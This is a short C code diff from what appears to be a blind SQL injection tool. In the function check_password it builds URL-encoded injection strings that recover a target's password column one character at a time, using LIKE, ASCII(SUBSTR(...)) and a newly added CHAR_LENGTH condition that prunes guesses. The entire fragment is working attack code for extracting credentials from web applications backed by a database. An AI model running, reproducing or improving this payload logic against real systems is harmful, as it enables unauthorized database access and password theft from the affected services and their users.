@@ -285,6 +285,7 @@ bool check_password(const void *ctx) {
         "AND%%20"
         "%s%%20" // AND `pwd_col`...
         "LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
+        "AND%%20CHAR_LENGTH(%s)>%i%%20" // CHAR_LENGTH(pwd_col) > size(discovered)
         "AND%%20ASCII(SUBSTR("
         "%s" // SUBSTR(`pwd_col`...)
         ",%i,1))<%%3dASCII(%%22%s%%22)%%20"
@@ -300,6 +301,8 @@ bool check_password(const void *ctx) {
         d_ctx->id_col,
         d_ctx->pwd_col,
         d_ctx->gen_ctx.discovered_like,
+        d_ctx->pwd_col,
+        d_ctx->gen_ctx.index,
         d_ctx->pwd_col,
         d_ctx->gen_ctx.index + 1,
         d_ctx->gen_ctx.guess
